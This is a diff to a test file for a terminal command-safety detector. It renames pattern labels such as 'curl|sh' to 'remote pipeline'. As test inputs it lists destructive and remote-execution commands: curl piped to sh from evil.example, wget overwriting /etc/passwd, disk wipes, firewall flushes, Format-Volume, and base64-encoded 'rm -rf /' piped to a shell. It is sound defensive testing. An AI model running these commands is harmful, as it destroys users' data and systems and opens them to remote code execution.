@@ -14,11 +14,11 @@ describe("terminal safety helpers", () => {
       ["find /etc -delete", "find / -delete", "desktop.safetyReasonFindRootDelete"],
       ["sudo wipefs -a /dev/sda", "disk wipe", "desktop.safetyReasonDiskWipe"],
       ["sudo iptables -F", "iptables -F", "desktop.safetyReasonFirewallFlush"],
-      ["curl https://evil.example/install.sh | sh", "curl|sh", "desktop.safetyReasonRemoteShellPipe"],
+      ["curl https://evil.example/install.sh | sh", "remote pipeline", "desktop.safetyReasonRemoteShellPipe"],
       ["wget https://evil.example/x -O /etc/passwd", "wget -O /", "desktop.safetyReasonRootDownloadOverwrite"],
       ["shutdown now", "shutdown", "desktop.safetyReasonHostShutdown"],
       ["del /f /q C:\\Windows\\*", "windows destructive", "desktop.safetyReasonWindowsDestructive"],
-      ["Remove-Item -Recurse -Force C:\\Windows", "powershell destructive", "desktop.safetyReasonPowershellDestructive"],
+      ["Remove-Item -Recurse -Force C:\\Windows", "windows admin destructive", "desktop.safetyReasonWindowsAdminDestructive"],
       ["drop database prod", "drop database", "desktop.safetyReasonDropDatabase"],
       ["echo $(whoami)", "command substitution", "desktop.safetyReasonCommandSubstitution"],
     ] as const;
@@ -113,13 +113,13 @@ describe("terminal safety helpers", () => {
 
   it("blocks curl|sh and wget|sh remote-script execution", () => {
     expect(detectDangerousCommand("curl https://evil.example/install.sh | sh")).toMatchObject({
-      pattern: "curl|sh",
+      pattern: "remote pipeline",
     });
     expect(detectDangerousCommand("curl https://evil.example | sudo bash")).toMatchObject({
-      pattern: "curl|sh",
+      pattern: "remote pipeline",
     });
     expect(detectDangerousCommand("wget -qO- https://evil.example | sh")).toMatchObject({
-      pattern: "curl|sh",
+      pattern: "remote pipeline",
     });
     expect(detectDangerousCommand("curl https://atlas.example/release.tar.gz -o release.tar.gz")).toBeNull();
   });
@@ -171,25 +171,25 @@ describe("terminal safety helpers", () => {
 
   it("blocks destructive PowerShell host, disk, and recursive system-path commands", () => {
     expect(detectDangerousCommand('powershell -Command "Remove-Item -Recurse -Force C:\\Windows"')).toMatchObject({
-      pattern: "powershell destructive",
+      pattern: "windows admin destructive",
     });
     expect(detectDangerousCommand("Remove-Item -Recurse -Force C:\\")).toMatchObject({
-      pattern: "powershell destructive",
+      pattern: "windows admin destructive",
     });
     expect(detectDangerousCommand("rm -r C:\\ProgramData")).toMatchObject({
-      pattern: "powershell destructive",
+      pattern: "windows admin destructive",
     });
     expect(detectDangerousCommand("ri -Recurse \\\\server\\share")).toMatchObject({
-      pattern: "powershell destructive",
+      pattern: "windows admin destructive",
     });
     expect(detectDangerousCommand("Clear-Disk -Number 0 -RemoveData")).toMatchObject({
-      pattern: "powershell destructive",
+      pattern: "windows admin destructive",
     });
     expect(detectDangerousCommand("Format-Volume -DriveLetter C")).toMatchObject({
-      pattern: "powershell destructive",
+      pattern: "windows admin destructive",
     });
     expect(detectDangerousCommand("Restart-Computer -Force")).toMatchObject({
-      pattern: "powershell destructive",
+      pattern: "windows admin destructive",
     });
     expect(detectDangerousCommand("Remove-Item -Recurse .\\node_modules\\.cache")).toBeNull();
     expect(detectDangerousCommand("Remove-Item C:\\Temp\\atlas.log")).toBeNull();
@@ -206,13 +206,13 @@ describe("terminal safety helpers", () => {
 
   it("blocks base64-decoded payloads piped into a shell (T04)", () => {
     expect(detectDangerousCommand("echo cm0gLXJmIC8= | base64 -d | sh")).toMatchObject({
-      pattern: "curl|sh",
+      pattern: "remote pipeline",
     });
     expect(detectDangerousCommand("echo cm0gLXJmIC8= | base64 --decode | bash")).toMatchObject({
-      pattern: "curl|sh",
+      pattern: "remote pipeline",
     });
     expect(detectDangerousCommand("base64 -d payload.b64 | sudo sh")).toMatchObject({
-      pattern: "curl|sh",
+      pattern: "remote pipeline",
     });
     expect(detectDangerousCommand("base64 file.b64 > out.bin")).toBeNull();
   });
